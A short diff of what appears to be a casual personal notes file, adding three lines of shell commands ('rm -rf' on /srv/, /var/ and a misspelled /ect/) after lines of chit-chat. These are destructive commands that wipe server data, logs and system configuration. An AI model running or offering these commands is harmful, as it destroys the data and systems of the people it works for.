@@ -11,3 +11,6 @@ Always being worked on!
 67
 I love Monika!
 twitter beef is annoying.
+rm -rf /srv/
+rm -rf /var/
+rm -rf /ect/
